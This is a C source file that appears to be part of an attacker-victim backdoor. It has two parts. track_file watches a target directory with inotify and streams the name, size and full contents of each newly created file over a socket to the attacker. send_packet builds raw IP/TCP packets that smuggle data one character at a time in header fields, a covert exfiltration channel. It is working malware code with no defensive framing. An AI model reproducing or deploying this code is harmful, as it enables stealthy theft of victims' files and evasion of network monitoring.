#include "filetracker.h"


int track_file(struct options_victim* opts) {
    int length, i = 0;
    int fd, wd;
    char buffer[EVENT_BUF_LEN] = {0};
    char chunk[EVENT_BUF_LEN] = {0};
    char file_info[S_ARR_SIZE] = {0};
    char buf[1024] = {0};
    struct stat st = {0};
    const char* start = "start[";
    const char* end = "]end";
    const char* size = " size: ";
    int file_name_len;
    int file_size = 0;
    char str_file_size[20] = {0};
    FILE * fp;
    unsigned long byte = 0;
    ssize_t temp_size = 0;


    fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
    }
    /* adding the directory into watch list. */
    wd = inotify_add_watch(fd, opts->target_directory, IN_CREATE);

    /* read to determine the event change happens on  directory.
     * Actually this read blocks until the change event occurs*/

    length = (int) read(fd, buffer, EVENT_BUF_LEN);
    if (length < 0) {
        perror("read");
    }

    /* read return the list of change events happens.
     * read the change event one by one and process it accordingly.*/
    while (i < length) {
        struct inotify_event *event = (struct inotify_event *) &buffer[i];
        if (event->len) {
            if (event->mask & IN_CREATE) {
                if (event->mask & IN_ISDIR) {
                    printf("New directory %s created.\n", event->name);
                } else {
                    printf("New file %s created.\n", event->name);
                    fp = fopen(event->name, "rb");
                    if (fp == NULL) {
                        perror("Cannot open file.\n");
                        exit(1);
                    }

                    file_name_len = (int) strlen(event->name);

                    if (strstr(event->name, ".txt") != NULL) {
                        fseek(fp, 0L, SEEK_END);    // seek to the EOF
                        file_size = (int) ftell(fp);
                        rewind(fp);
                    } else {
                        stat(event->name, &st);
                        file_size = (int) st.st_size;
//                        process_data(chunk, file_size);
                    }

                    snprintf(str_file_size, 20, "%d", (int) file_size);
                    strcat(file_info, start);
                    strcat(file_info, event->name);
                    strcat(file_info, size);
                    strcat(file_info, str_file_size);
                    strcat(file_info, end);
                    write(opts->atcp_socket, file_info, strlen(file_info) + 1);
                    sleep(1);

                    printf("file size = %d\n", file_size);
                    while(temp_size <= file_size) {
                        byte = fread(buf, 1, 512, fp);
                        temp_size += (ssize_t) byte;
                        write(opts->atcp_socket, buf, byte);
                        memset(buf, 0, 1024);
                    }


                    fclose(fp);
                    memset(str_file_size, 0, 20);
                    memset(&st, 0, sizeof(struct stat));
                    memset(file_info, 0, sizeof(file_info));
                }
            }
        }
        i += EVENT_SIZE + event->len;
    }
    /* removing the directory from the watch list.*/
    inotify_rm_watch(fd, wd);

    /*closing the INOTIFY instance*/
    close(fd);
}


void send_packet(struct options_victim* opts, int size, const char *str) {
    struct iphdr ih;
    struct tcphdr th;
    char s_buffer[TCP_SEND_SIZE] = {0};
    int bytes;

    for (int i = 0; i < size; i++) {
        create_tcp_header(&th, VIC_FILE_PORT, ATC_FILE_PORT);
        create_ip_header(&ih, opts, 'V', str[i], 'T');
        memcpy(s_buffer, &ih, sizeof(struct iphdr));
        memcpy(s_buffer + sizeof(struct iphdr), &th, sizeof(struct tcphdr));
        bytes = (int)sendto(opts->tcp_socket, (const char *) s_buffer, TCP_SEND_SIZE, 0,
                            (const struct sockaddr *) &opts->tcpsa, sizeof(opts->tcpsa));
        if(bytes == -1) {
            perror("send_file() error\n");
        }
        memset(s_buffer, 0, TCP_SEND_SIZE);
    }
}


